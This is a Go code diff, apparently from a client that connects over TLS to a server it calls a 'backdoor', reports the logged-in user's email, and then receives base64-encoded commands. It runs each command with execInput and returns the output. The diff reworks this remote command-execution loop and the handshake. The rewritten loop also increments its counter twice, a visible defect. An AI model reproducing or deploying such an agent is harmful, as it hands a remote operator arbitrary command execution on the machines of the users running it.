@@ -15,6 +15,7 @@ import (
 	"net/mail"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
@@ -348,26 +349,22 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 	conn := dialReDial(CONFIG.HOST+":"+CONFIG.PORT, &config)
 	defer conn.Close()
 	introduceUserToBackdoor(conn, GetLoggedUser())
-	for {
+	num := readCmdLen(conn)
+	fmt.Println(num)
+	for count:=0;count < num;count++ {
 		buffer := make([]byte, 1024)
 		setReadDeadLine(conn)
 		_, err := conn.Read(buffer)
 		if err != nil {
-			CONFIG.CLIENTLOG.Println("Checking status.")
-			// if err == io.EOF {
-			// 	CONFIG.CLIENTLOG.Println("All commands ran successfully. Returning exit success.")
-			// 	logClean("./logs/")
-			// 	fmt.Println("Exit Success.")
-			// 	returnLog()
-			// 	os.Exit(0)
-			// }
+			CONFIG.CLIENTLOG.Println("Read Error. Exiting. Internal error or server disconnected. Exiting...")
+			return
 		}
 		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
-		CONFIG.CLIENTLOG.Println("EXECUTE: ", string(sDec))
+		CONFIG.CLIENTLOG.Println("\nEXECUTE:\n", string(sDec))
 		resp := execInput(string(sDec))
 		time.Sleep(time.Second)
 		encodedResp := base64.StdEncoding.EncodeToString([]byte(resp))
-		CONFIG.CLIENTLOG.Println("RES:\n", resp)
+		CONFIG.CLIENTLOG.Println("\nRES:\n", resp)
 		setWriteDeadLine(conn)
 		_, err = conn.Write([]byte(encodedResp))
 		if err != nil {
@@ -376,9 +373,16 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 		}
 		time.Sleep(time.Second)
 		buffer = nil
+		count++
 	}
+
+	CONFIG.CLIENTLOG.Println("All commands ran successfully. Returning exit success.")
+	logClean("./logs/")
+	fmt.Printf("Exit Success.\nReturning Log.\n\n")
+	returnLog()
 }
 
+//
 func introduceUserToBackdoor(conn *tls.Conn, user t.LoggedUser) {
 
 	encodedResp := base64.StdEncoding.EncodeToString([]byte(user.EMAIL))
@@ -388,38 +392,40 @@ func introduceUserToBackdoor(conn *tls.Conn, user t.LoggedUser) {
 		CONFIG.CLIENTLOG.Println("Write Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
 		os.Exit(1)
 	}
-	time.Sleep(2*time.Second)
+	time.Sleep(2 * time.Second)
 	buffer := make([]byte, 1024)
 	setReadDeadLine(conn)
 	_, err = conn.Read(buffer)
-	if err != nil{
+
+	if err != nil {
 		CONFIG.CLIENTLOG.Println("Read Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
 		os.Exit(1)
 	}
 	sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
-	if string(sDec) != "ok"{
-		CONFIG.CLIENTLOG.Println("Fatal. Could not introduce client to backdoor. "+string(buffer))
+	if string(sDec) != "ok" {
+		CONFIG.CLIENTLOG.Println("Fatal. Could not introduce client to backdoor. " + string(buffer))
 		os.Exit(1)
 	}
-	time.Sleep(time.Second*2)
-	setReadDeadLine(conn)
-	_, err = conn.Read(buffer)
-	if err != nil{
-		CONFIG.CLIENTLOG.Println("Read Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
-		os.Exit(1)
-	}
-
-	setReadDeadLine(conn)
-	_, err = conn.Read(buffer)
-	if err != nil{
-		CONFIG.CLIENTLOG.Println("Read Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
-		os.Exit(1)
-	}
-	sDec, _ = base64.StdEncoding.DecodeString(string(buffer[:]))
-	CONFIG.CLIENTLOG.Println("Client-Server-Intro="+string(sDec))
+	CONFIG.CLIENTLOG.Println("Client-Server-Intro=" + string(sDec))
+	buffer = nil
+	time.Sleep(time.Second * 2)
 
 }
-
+//not the best way to do things but...
+func readCmdLen(conn *tls.Conn) int {
+	buffer := make([]byte, 1024)
+	setReadDeadLine(conn)
+	_, err := conn.Read(buffer)
+	if err != nil {
+		CONFIG.CLIENTLOG.Println("Read Error. Could not introduce client to backdoor. Internal error or server disconnected. Exiting...")
+		os.Exit(1)
+	}
+	time.Sleep(2 * time.Second)
+	sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
+	buffer = nil
+	i, _ := strconv.Atoi(string(sDec))
+	return i
+}
 func validateEMailAddress(address string) bool {
 	_, err := mail.ParseAddress(address)
 	return err == nil
